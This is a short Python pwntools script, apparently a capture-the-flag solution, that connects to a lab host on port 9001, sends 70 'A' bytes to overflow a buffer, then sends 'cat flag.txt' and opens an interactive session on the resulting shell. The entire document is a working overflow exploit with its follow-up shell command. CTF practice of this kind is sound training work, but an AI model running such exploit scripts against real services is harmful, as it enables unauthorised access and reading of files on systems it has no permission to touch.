from pwn import *

IP = "10.10.109.171"

PORT = 9001

io = remote(IP, PORT)

print(io.recv().decode('latin-1'))

io.sendline(b'A'*70)

print(io.recv().decode('latin-1'))

io.sendline(b'cat flag.txt')

io.interactive()
